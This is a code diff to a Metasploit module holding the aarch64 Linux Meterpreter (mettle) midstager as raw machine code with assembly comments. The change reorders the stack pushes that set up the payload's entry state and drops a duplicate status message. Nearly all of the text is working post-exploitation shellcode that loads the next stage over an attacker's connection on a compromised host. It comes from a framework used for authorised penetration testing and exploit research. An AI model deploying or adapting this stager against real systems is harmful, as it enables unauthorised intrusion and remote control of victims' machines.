@@ -40,7 +40,6 @@ module MetasploitModule
     # Generated from external/source/shellcode/linux/aarch64/stage_mettle.s
     midstager = [
 
-
             0x10000782,          #  adr	x2, f0 <size>
             0xb9400042,          #  ldr	w2, [x2]
             0xaa0203ea,          #  mov	x10, x2
@@ -78,22 +77,22 @@ module MetasploitModule
             0xd2800da1,          #  mov	x1, #0x6d                  	// #109
             0xf90003e1,          #  str	x1, [sp]
             0x910003e1,          #  mov	x1, sp
-            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
             0xaa0c03e2,          #  mov	x2, x12
             0xd2800003,          #  mov	x3, #0x0                   	// #0
-            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
             0xd2800004,          #  mov	x4, #0x0                   	// #0
             0xd28000e5,          #  mov	x5, #0x7                   	// #7
-            0xa9bf17e4,          #  stp	x4, x5, [sp,#-16]!
             0xaa0a03e6,          #  mov	x6, x10
             0xd28000c7,          #  mov	x7, #0x6                   	// #6
-            0xa9bf1fe6,          #  stp	x6, x7, [sp,#-16]!
             0xd2820008,          #  mov	x8, #0x1000                	// #4096
             0xd2800329,          #  mov	x9, #0x19                  	// #25
-            0xa9bf27e8,          #  stp	x8, x9, [sp,#-16]!
             0xaa0a03ea,          #  mov	x10, x10
             0xd280000b,          #  mov	x11, #0x0                   	// #0
             0xa9bf2fea,          #  stp	x10, x11, [sp,#-16]!
+            0xa9bf27e8,          #  stp	x8, x9, [sp,#-16]!
+            0xa9bf1fe6,          #  stp	x6, x7, [sp,#-16]!
+            0xa9bf17e4,          #  stp	x4, x5, [sp,#-16]!
+            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
+            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
             0xd280001d,          #  mov	x29, #0x0                   	// #0
             0xd280001e,          #  mov	x30, #0x0                   	// #0
             0xd61f01c0,          #  br	x14
@@ -101,7 +100,6 @@ module MetasploitModule
             0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
             0xd4000001,          #  svc	#0x0
             0xd503201f,          #  nop
-
             payload.length,
             0x00000000,          #  .word	0x00000000
             entry_offset,
@@ -109,7 +107,6 @@ module MetasploitModule
         ].pack('V*')
 
     print_status("Transmitting intermediate midstager...(#{midstager.length} bytes)")
-    print_status("Transmitting intermediate paystager...(#{payload.length} bytes)")
     conn.put([midstager.length].pack('V'))
     conn.put(midstager) == midstager.length
   end
